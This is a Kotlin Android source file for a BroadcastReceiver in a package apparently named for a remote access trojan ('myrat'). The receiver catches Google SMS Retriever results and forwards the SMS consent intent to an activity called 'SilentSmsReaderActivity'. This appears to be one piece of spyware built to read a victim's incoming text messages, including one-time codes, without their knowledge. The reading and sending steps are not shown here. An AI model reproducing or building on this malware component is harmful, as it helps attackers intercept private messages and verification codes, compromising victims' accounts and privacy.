package com.myrat.app.receiver

import android.content.*
import android.content.Intent
import com.google.android.gms.auth.api.phone.SmsRetriever
import com.google.android.gms.common.api.CommonStatusCodes
import com.google.android.gms.common.api.Status
import com.myrat.app.SilentSmsReaderActivity
import com.myrat.app.utils.Logger

class SmsConsentReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action != SmsRetriever.SMS_RETRIEVED_ACTION) return
        val extras = intent.extras ?: return
        val status = extras[SmsRetriever.EXTRA_STATUS] as? Status

        if (status?.statusCode == CommonStatusCodes.SUCCESS) {
            val consentIntent = extras.getParcelable<Intent>(SmsRetriever.EXTRA_CONSENT_INTENT)
            context?.startActivity(Intent(context, SilentSmsReaderActivity::class.java).apply {
                putExtra("consentIntent", consentIntent)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } else if (status?.statusCode == CommonStatusCodes.TIMEOUT) {
            Logger.error("SMS Consent timed out")
        }
    }
}
